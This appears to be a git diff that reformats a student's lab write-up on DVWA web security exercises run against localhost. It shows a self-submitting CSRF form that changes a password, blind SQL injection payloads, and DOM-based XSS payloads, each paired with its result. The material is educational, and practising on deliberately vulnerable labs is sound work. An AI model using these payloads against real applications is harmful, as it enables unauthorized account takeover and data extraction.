@@ -161,7 +161,7 @@ without verifying their origin at all.
 and then
 
 ```html
-<form action="http://dvwa/vulnerabilities/csrf/" method="GET">
+<form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
   <input type="hidden" name="password_new" value="hacked123">
   <input type="hidden" name="password_conf" value="hacked123">
   <input type="hidden" name="Change" value="Change">
@@ -193,11 +193,17 @@ needed, the server rejects it.
 <http://localhost:8080/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change></ins>
 and then
 
-\<form action="http://dvwa/vulnerabilities/csrf/" method="GET"\> \<input
-type="hidden" name="password_new" value="hacked123"\> \<input
-type="hidden" name="password_conf" value="hacked123"\> \<input
-type="hidden" name="Change" value="Change"\> \</form\> \<script\>
-document.forms\[0\].submit(); \</script\> in a new html file
+```html
+<form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
+  <input type="hidden" name="password_new" value="hacked123">
+  <input type="hidden" name="password_conf" value="hacked123">
+  <input type="hidden" name="Change" value="Change">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+```
+in a new HTML file.
 
 <ins>Result:</ins> Password change failed
 
@@ -413,8 +419,8 @@ which is the real problem.
 1.  <ins>Security Level:</ins> Low
 
 <ins>Payload Used:</ins> 
-1' AND 1=1 \#, 
-1' AND 1=2 \#, 
+1' AND 1=1 \#,  
+1' AND 1=2 \#,  
 1 AND SUBSTRING(database(),1,1)='d' (if first letter of database name is ‘d’)
 
 <ins>Result:</ins> Query reveals injection works, and to ask yes/no
@@ -439,7 +445,7 @@ extract database information by asking true/false questions.
 2.  <ins>Security Level:</ins> Medium
 
 <ins>Payload Used:</ins> 
-1 AND 1=1 \#, 
+1 AND 1=1 \#,  
 1 AND 1=2
 
 <ins>Result:</ins> Query reveals injection works through browser
@@ -551,7 +557,7 @@ predict.
 1.  <ins>Security Level:</ins> Low
 
 <ins>Payload Used:</ins>
-http://localhost:8080/vulnerabilities/xss_d/?default=<script>alert('XSS')\</script>
+[http://localhost:8080/vulnerabilities/xss_d/?default=<script>alert('XSS')\</script>](url)
 
 <ins>Result:</ins> Alert popped up with the text “XSS”
 
@@ -567,8 +573,8 @@ without sanitizing it.
 2.  <ins>Security Level:</ins> Medium
 
 <ins>Payload Used:</ins>
-http://localhost:8080/vulnerabilities/xss_d/?default=<img src=x
-onerror=alert('XSS')>
+[http://localhost:8080/vulnerabilities/xss_d/?default=<img src=x
+onerror=alert('XSS')>](url)
 
 <ins>Result:</ins> Alert popped up with the text “XSS”.
 
@@ -584,8 +590,8 @@ only blocks \<script\> but does not sanitize event attributes.
 
 3.  <ins>Security Level:</ins> High
 
-<ins>Payload Used:</ins> http://localhost:8080/vulnerabilities/xss_d/#\<img
-src=x onerror=alert('XSS')\>
+[<ins>Payload Used:</ins> http://localhost:8080/vulnerabilities/xss_d/#\<img
+src=x onerror=alert('XSS')\>](url)
 
 <ins>Result:</ins> Alert popped up with text “XSS”’
 
